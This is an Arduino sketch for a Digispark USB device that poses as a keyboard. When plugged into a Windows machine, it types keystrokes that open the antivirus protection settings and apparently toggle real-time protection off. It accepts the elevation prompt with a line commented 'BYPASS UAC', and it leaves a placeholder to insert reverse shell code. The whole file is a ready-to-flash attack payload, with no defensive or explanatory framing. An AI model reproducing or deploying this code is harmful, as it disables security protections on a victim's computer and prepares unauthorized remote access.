#include "DigiKeyboard.h"

#define KEY_ESC      41
#define KEY_TAB      43
#define KEY_F4       61

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT); //open search bar
  DigiKeyboard.delay(500);
  DigiKeyboard.print("virus pro");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // BYPASS UAC
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // close the current window

  /** INSERT YOUR REVERSE SHELL CODE HERE OR OTHERS **/
  digitalWrite(1, HIGH); //Turn on LED Light
  for(;;){} // stop process from looping

}
